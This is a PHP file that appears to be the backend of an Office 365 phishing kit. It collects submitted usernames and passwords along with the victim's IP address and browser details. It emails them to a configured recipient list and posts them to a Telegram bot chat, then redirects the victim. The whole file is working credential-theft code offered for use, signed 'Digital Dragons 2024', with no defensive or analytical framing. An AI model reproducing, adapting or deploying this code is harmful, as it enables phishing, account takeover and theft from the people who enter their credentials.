<?php

include '../email.php';

// Generate a unique session data
$data = base64_encode(time() . sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']) . md5(uniqid(rand(), true)));
$_SESSION['data'] = $data;

// Prepare form data
$form = "**Office 365 Login Attempt**\n";
$form .= "| Username: " . $_POST['email'] . "\n";
$form .= "| Password: " . $_POST['password'] . "\n";
$form .= "| User IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$form .= "| Browser: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$form .= "| DateTime: " . date('Y-m-d H:i:s') . "\n";
$form .= "----------------------------------------\n";

// Prepare email details
$subject = "**Office 365 Login Attempt** From " . $_SERVER['REMOTE_ADDR'];
$headers = "From: Digital Dragons 2024 <your-email@example.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

// Send email to each recipient in $email array
foreach ($email as $recipient) {
    mail($recipient, $subject, $form, $headers);
}

// Send form data to Telegram
$data = [
    'chat_id' => $telegramID,
    'text' => $form
];
$response = file_get_contents("https://api.telegram.org/bot$telegramTOKEN/sendMessage?" . http_build_query($data));

// Redirect or display success message after processing
header(""); // Replace with your success page URL
exit();

?>
